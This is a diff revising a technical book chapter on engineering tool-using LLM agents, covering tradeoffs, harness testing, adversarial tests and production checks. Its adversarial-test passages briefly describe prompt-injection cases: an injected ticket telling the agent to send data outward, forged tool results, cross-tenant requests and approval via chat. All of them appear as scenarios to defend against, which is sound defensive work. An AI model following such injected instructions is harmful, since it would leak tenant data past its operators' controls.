-**Sandbox escape of resources.** Symptom: host CPU or disk saturates during code-execution tool use. Telemetry: sandbox durations near the timeout, `signal: SIGKILL` or `SIGXCPU` in results, growing temp directories. Cause: limits not applied (non-POSIX host, a kernel ignoring the address-space limit) or a child process outliving its parent when not run in its own session.
+**Sandbox escape of resources.** Symptom: host CPU or disk saturates during code execution. Telemetry: sandbox durations near the timeout, `SIGKILL` or `SIGXCPU` in results, growing temp directories. Cause: limits not applied (non-POSIX host, a kernel ignoring the address-space limit) or a child outliving its parent because it was not in its own session.
 
 ## Tradeoffs
 
-**Strict schemas versus model flexibility.** Tight enums and patterns cut invalid calls and make validation trivial, but every new legitimate value requires a schema change, and over-constrained fields force the model into wrong-but-valid choices. Constrain identifiers and closed sets; leave descriptive text free and bounded by length.
+> **Deep dive.** Design choices against their alternatives; skip on a first reading.
 
-**Many narrow tools versus few broad ones.** Narrow tools are safer and easier to describe; a large menu costs tokens and selection accuracy. Resolve it with per-task filtering, not by merging tools across risk classes into one `execute_action(type, params)` god tool.
+**Strict schemas versus model flexibility.** Tight enums cut invalid calls, but each new legitimate value needs a schema change, and over-constrained fields force wrong-but-valid choices. Constrain identifiers and closed sets; leave descriptive text free but length-bounded.
 
-**Approval versus autonomy.** Every approval buys safety with latency and human attention. The side-effect class is the default dividing line; argument-based escalation (a P1 ticket by a non-lead, a refund above a threshold) lets routine actions run while unusual ones wait.
+**Many narrow tools versus few broad ones.** Resolve the menu-size cost with per-task filtering, not an `execute_action(type, params)` god tool spanning risk classes.
 
-**Default idempotency scope.** Hashing arguments within a session suppresses accidental duplicates and, occasionally, an intended one. Client-supplied keys are more precise but require cooperation from the caller. Choose per tool and document it.
+**Approval versus autonomy.** The side-effect class is the default line; argument-based escalation (a P1 ticket by a non-lead, a refund above a threshold) lets routine actions run while unusual ones wait.
 
-**Thread timeouts versus process isolation.** Threads are cheap and fine for I/O handlers with their own timeouts, but cannot be killed. Subprocesses can be killed and limited, at the cost of startup time and serialization. Containers and microVMs give real isolation at higher cost still. Use the cheapest level that matches how much you distrust the code.
+**Thread timeouts versus process isolation.** Threads are cheap but cannot be killed; subprocesses can, at the cost of startup time; containers and microVMs isolate further at higher cost. Use the cheapest level that matches how much you distrust the code.
 
-**Hosted tools versus your own.** A provider-hosted search or code tool costs nothing to build and adds no service to run, but it gives up argument-level policy, idempotency, and a pre-execution audit record, and its egress bypasses your network controls. Wrapping the same capability as your own tool costs a handler and a sandbox or egress proxy, and buys back every control in this chapter. Use hosted tools for public, read-only work; own anything that touches tenant data or writes.
+**Hosted tools versus your own.** A hosted tool costs nothing to build or run but gives up the controls listed in Provider-hosted tools; wrapping it yourself costs a handler and an egress proxy and buys them back.
 
-**In-process policy versus a policy service.** `PolicyEngine` is plain Python, fast, testable, and versioned with the application. A central policy service (for example one evaluating a policy language) gives one place to audit rules across many applications, at the cost of a network hop per call and a second deployment. Start in-process; extract when several services share rules.
+**In-process policy versus a policy service.** `PolicyEngine` is fast, testable, and versioned with the application; a central policy service gives one place to audit rules across applications, at the cost of a network hop per call. Start in-process; extract when several services share rules.
 
 ## Evaluation and testing
 
-Test the harness deterministically and the model's tool use statistically; they answer different questions.
+> **Deep dive.** How to test the harness and the model's tool use; skip on a first reading.
 
-**Harness tests, offline, exact.** These are most of the `toolkit` and Project 4 suites, and they run offline. Script the model's turns with `FakeLLM` and assert on outcomes that do not depend on model quality: the right category for each failure, no handler call on denial, exactly one side effect for two identical calls (in memory and in SQLite), `outcome_unknown` after a write timeout and no second attempt, reconcile resolving it, approval refused for changed arguments and after use, writes refused while the idempotency store is down, tools not offered never executed, truncation announced, sandbox secrets not inherited and runaway code killed. The Project 4 scenarios cover the required paths: a happy path that reads status and tickets, permission denial for a read-only user and a contractor, approval required then approved (and rejected, and four-eyes), a duplicate `create_ticket` suppressed, a reply on another tenant's ticket refused, an injected ticket whose instruction to send data outward is blocked by the recipient allowlist before any approval exists, and a transient status error retried to success and to exhaustion.
+Test the harness deterministically and the model's tool use statistically.
 
-**Adversarial tests.** Treat the injection test as a template. Assume the model is fully compromised, script it to do the worst thing the attacker wants, and assert that the effect does not happen and the audit trail shows why. Extend it per Chapter 26's catalogue: forged tool results inside ticket text, requests for another tenant's records, attempts to approve via chat, loops designed to exhaust budget.
+**Harness tests, offline, exact.** Script the model's turns with `FakeLLM` and assert on outcomes independent of model quality: the right category for each failure, no handler call on denial, one side effect for two identical calls, `outcome_unknown` after a write timeout with no second attempt, approval refused for changed arguments and after use, unoffered tools never executed. Project 4's scenarios add end-to-end paths: denials, approval and four-eyes, duplicate suppression, a cross-tenant reply refused, and the injection test.
 
-**Model-in-the-loop evaluation.** With a real model, run labeled conversations and score trajectories, not just final text: tool selection accuracy, argument validity rate on first attempt, repair success rate, unnecessary calls per task, permission-denial rate on benign tasks (a high rate means descriptions invite forbidden actions), and the rate at which the model correctly reports pending approvals instead of claiming success. A final answer can be right while the trajectory leaked data or took ten rounds. Chapter 24 provides the evaluation harness and Chapter 25 the agent-specific evaluators.
+**Adversarial tests.** Treat the injection test as a template: script a fully compromised model's worst call and assert that the effect does not happen and the audit trail shows why. Extend it with Chapter 26's catalogue (forged tool results in ticket text, cross-tenant requests, approval via chat).
 
-**Production checks.** Replay sampled audit trails against a new policy version before deploying it (would any executed call now be denied, or any denied call now allowed?), and canary description changes with the selection metrics above.
+**Model-in-the-loop evaluation.** With a real model, score trajectories, not just final text: selection accuracy, first-attempt argument validity, repair success, unnecessary calls, denials on benign tasks (descriptions inviting forbidden actions), and whether the model reports pending approvals instead of claiming success. Chapter 24 provides the evaluation harness and Chapter 25 the agent-specific evaluators.
+
+**Production checks.** Replay sampled audit trails against a new policy version before deploying it (would any executed call now be denied, or any denied call allowed?), and canary description changes with the selection metrics above.
 
 ## Before you ship
 
